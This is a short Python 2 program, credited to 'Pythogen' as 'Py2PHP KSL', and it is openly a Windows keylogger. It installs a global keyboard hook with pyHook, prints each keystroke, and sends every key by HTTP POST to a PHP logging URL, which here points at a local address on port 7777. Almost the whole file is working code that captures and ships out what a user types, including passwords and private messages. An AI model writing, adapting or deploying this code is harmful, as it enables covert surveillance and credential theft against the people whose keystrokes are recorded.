                                  
#  _____     _   _                   
# |  _  |_ _| |_| |_ ___ ___ ___ ___ 
# |   __| | |  _|   | . | . | -_|   |
# |__|  |_  |_| |_|_|___|_  |___|_|_|
#       |___|           |___|        
# Py2PHP KSL
# By Pythogen

# Load modules
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import sys
import urllib
import urllib2

# URL to PHP Server to transfer logs.
log2url = 'http://127.0.0.1:7777/log/index.php'

# Globalize and Initially Declare 
global charRep

# Keystroke storage variable
charRep = 'X'

# Main Routine
def Main():

	# Enable access to toPHP globally.
	global toPHP

	# Create hook
	kl = pyHook.HookManager()
	kl.KeyDown = KeyIN
	# Register hook and register
	kl.HookKeyboard()
	pythoncom.PumpMessages()


# Key input function
def KeyIN(event):

	# Variable storing specific key stroke
	charRep = chr(event.Ascii)

	# Dictionary containing sendabe data.
	toPHP = \
	{
		# Data to send (Key, Input) ->
		'Key' : charRep
	}

	# Detect letter AND numerical keys
	if event.Ascii > 32 and event.Ascii < 127:
		sys.stdout.write(chr(event.Ascii))
		charRep = chr(event.Ascii)

	# Detect space bar input specifically
	elif event.Ascii == 32:
		print " ",
		charRep = " "

	# Detect special input such as Tab, Shift, etc..
	else:
		print "[%s]" % event.Key,
		charRep = "[%s]" % event.Key,

	# Send key to PHP file.
	data = urllib.urlencode(toPHP)
	req = urllib2.Request(log2url, data)
	response = urllib2.urlopen(req)
	the_page = response.read()
	#print the_page

	# Return to hook
	return True

# Call Main routine.
Main()